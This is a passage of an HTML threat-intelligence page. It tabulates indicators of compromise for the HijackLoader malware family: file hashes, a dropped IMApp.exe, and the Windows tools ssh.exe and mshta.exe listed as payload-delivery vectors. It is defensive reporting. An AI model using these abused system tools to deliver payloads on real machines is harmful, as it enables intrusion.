                    16a6d0aeccbcab6dc54c164e397f28b328ae947715d1400013ef8a647d07e856
                  </td>
                  <td>lueffw</td>
                  <td>HijackLoader</td>
                </tr>
                <tr>
                  <td>Artifacts dropped</td>
                  <td>sha256</td>
                  <td>
                    9b398917c796083a6005ab3f9d78243dbc0fad12be1e196be2b01041d4c951a7
                  </td>
                  <td>IMApp.exe</td>
                  <td>HijackLoader</td>
                </tr>
                <tr>
                  <td>Payload delivery</td>
                  <td>filename</td>
                  <td>%WINDIR%\System32\OpenSSH\ssh.exe</td>
                  <td></td>
                  <td></td>
                </tr>
                <tr>
                  <td>Payload delivery</td>
                  <td>filename</td>
                  <td>%WINDIR%\System32\mshta.exe</td>
                  <td></td>
                  <td></td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>

<style>
  .table-striped > tbody > tr:nth-of-type(odd) > * {
    --bs-table-color-type: #ffffff;
    --bs-table-bg-type: var(--bs-table-striped-bg);
  }
</style>
